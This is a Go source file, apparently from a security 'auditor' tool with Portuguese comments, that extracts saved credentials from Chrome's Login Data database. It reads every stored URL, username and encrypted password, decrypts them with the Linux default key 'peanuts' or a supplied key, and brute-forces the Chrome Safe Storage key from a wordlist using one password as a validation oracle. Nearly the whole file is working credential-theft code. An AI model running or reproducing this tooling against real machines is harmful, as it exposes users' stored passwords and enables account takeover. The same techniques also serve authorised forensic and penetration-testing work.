package attacks

import (
	"auditor/crypto"
	"bufio"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"strings"
)

// BrowserCredential representa uma credencial extraída do browser.
type BrowserCredential struct {
	URL       string `json:"url"`
	Username  string `json:"username"`
	Password  string `json:"password"`
	Encrypted bool   `json:"encrypted"` // true = não conseguiu decriptar
	Note      string `json:"note,omitempty"`
}

// BrowserResult é o resultado da extração.
type BrowserResult struct {
	Source     string              `json:"source"`     // "chrome" | "firefox"
	Creds      []BrowserCredential `json:"creds"`
	MasterKey  string              `json:"masterKey,omitempty"`
	Error      string              `json:"error,omitempty"`
	Sqlite3OK  bool                `json:"sqlite3Ok"`
}

// ExtractChromeCredentials lê um arquivo Login Data do Chrome e tenta decriptar
// as senhas usando o masterPassword fornecido (padrão Linux: "peanuts").
func ExtractChromeCredentials(dbPath, masterPassword string) *BrowserResult {
	result := &BrowserResult{Source: "chrome"}

	if masterPassword == "" {
		masterPassword = "peanuts"
	}

	// Verifica se sqlite3 está disponível
	if _, err := exec.LookPath("sqlite3"); err != nil {
		result.Error = "sqlite3 não encontrado. Instale com: apt install sqlite3"
		return result
	}
	result.Sqlite3OK = true

	// Copia o arquivo (Chrome pode estar com lock)
	tmpPath, err := copyToDB(dbPath)
	if err != nil {
		result.Error = fmt.Sprintf("erro ao ler arquivo: %v", err)
		return result
	}
	defer os.Remove(tmpPath)

	// Query: pega URL, usuário e senha (hex) de todos os logins
	rows, err := sqlite3Query(tmpPath,
		"SELECT origin_url, username_value, hex(password_value) FROM logins")
	if err != nil {
		result.Error = fmt.Sprintf("erro SQLite: %v", err)
		return result
	}

	for _, row := range rows {
		if len(row) < 3 {
			continue
		}
		cred := BrowserCredential{
			URL:      row[0],
			Username: row[1],
		}

		if row[2] == "" {
			result.Creds = append(result.Creds, cred)
			continue
		}

		encBytes, err := hex.DecodeString(row[2])
		if err != nil {
			cred.Encrypted = true
			cred.Note = "hex decode error"
			result.Creds = append(result.Creds, cred)
			continue
		}

		plaintext, err := crypto.ChromeDecrypt(encBytes, masterPassword)
		if err != nil || !crypto.IsPrintable([]byte(plaintext)) {
			cred.Encrypted = true
			cred.Note = "chave incorreta ou formato não suportado"
		} else {
			cred.Password = plaintext
		}
		result.Creds = append(result.Creds, cred)
	}

	result.MasterKey = masterPassword
	return result
}

// BruteForceChromeMasterKey testa senhas da wordlist como Chrome Safe Storage key.
// Usa a primeira senha criptografada como oráculo de validação.
func BruteForceChromeMasterKey(dbPath, wordlistPath string, onProgress func()) (string, error) {
	if _, err := exec.LookPath("sqlite3"); err != nil {
		return "", fmt.Errorf("sqlite3 não encontrado: apt install sqlite3")
	}

	tmpPath, err := copyToDB(dbPath)
	if err != nil {
		return "", err
	}
	defer os.Remove(tmpPath)

	// Pega uma amostra criptografada para testar
	rows, err := sqlite3Query(tmpPath,
		"SELECT hex(password_value) FROM logins WHERE length(password_value) > 3 LIMIT 1")
	if err != nil || len(rows) == 0 {
		return "", fmt.Errorf("nenhuma senha criptografada encontrada no arquivo")
	}

	sample, err := hex.DecodeString(rows[0][0])
	if err != nil || len(sample) < 4 {
		return "", fmt.Errorf("amostra inválida")
	}

	prefix := string(sample[:3])
	if prefix != "v10" && prefix != "v11" {
		return "", fmt.Errorf("formato não suportado: %q (esperado v10 ou v11)", prefix)
	}

	// Brute-force: testa cada palavra do wordlist
	f, err := os.Open(wordlistPath)
	if err != nil {
		return "", fmt.Errorf("wordlist não encontrada: %s", wordlistPath)
	}
	defer f.Close()

	sc := bufio.NewScanner(f)
	for sc.Scan() {
		word := strings.TrimSpace(sc.Text())
		if word == "" {
			continue
		}
		if onProgress != nil {
			onProgress()
		}

		plaintext, err := crypto.ChromeDecrypt(sample, word)
		if err == nil && crypto.IsPrintable([]byte(plaintext)) {
			return word, nil
		}
	}

	return "", nil
}

// ── Helpers ───────────────────────────────────────────────────────────────────

func copyToDB(src string) (string, error) {
	data, err := os.ReadFile(src)
	if err != nil {
		return "", fmt.Errorf("não foi possível ler: %w", err)
	}
	if len(data) < 16 || !strings.HasPrefix(string(data[:16]), "SQLite format 3") {
		return "", fmt.Errorf("arquivo não é um banco SQLite válido")
	}
	tmp, err := os.CreateTemp("", "cs-browser-*.db")
	if err != nil {
		return "", err
	}
	defer tmp.Close()
	if _, err := tmp.Write(data); err != nil {
		return "", err
	}
	return tmp.Name(), nil
}

func sqlite3Query(dbPath, query string) ([][]string, error) {
	out, err := exec.Command("sqlite3", "-separator", "\t", dbPath, query).Output()
	if err != nil {
		return nil, err
	}
	var rows [][]string
	for _, line := range strings.Split(string(out), "\n") {
		line = strings.TrimRight(line, "\r")
		if line == "" {
			continue
		}
		rows = append(rows, strings.Split(line, "\t"))
	}
	return rows, nil
}
